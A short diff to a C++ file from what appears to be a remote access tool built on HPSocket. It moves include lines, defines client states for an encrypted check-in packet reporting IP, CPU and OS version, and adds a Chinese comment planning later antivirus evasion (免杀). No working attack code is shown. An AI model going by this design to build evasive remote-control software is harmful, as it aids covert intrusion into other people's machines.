@@ -18,6 +18,7 @@
 //#endif
 
 
+// 之后要做一些免杀，所以就不支持x64了，下面两个就都用x86的吧。
 #ifdef _DEBUG
 	#pragma comment(lib, "./HPSocket/HPSocket_UD.lib")
 #else
@@ -26,6 +27,9 @@
 
 
 #include <iostream>
+#include <Windows.h>
+#include  "strsafe.h"
+#include <assert.h>
 
 
 
@@ -54,13 +58,6 @@ enum CLIENT_STATUS {
 	WAIT_FOR_LOGIN,		// 等待上线包（使用对称加密算法加密），该包有IP，CPU，系统版本等信息。
 	LOGINED				// 已登录，（接收到通信密钥和上线包后）正式建立通信。
 };
-
-
-
-
-
-#include  "strsafe.h"
-#include <assert.h>
 
 
 #define CRYPTO_KEY_PACKET_LENGTH 33
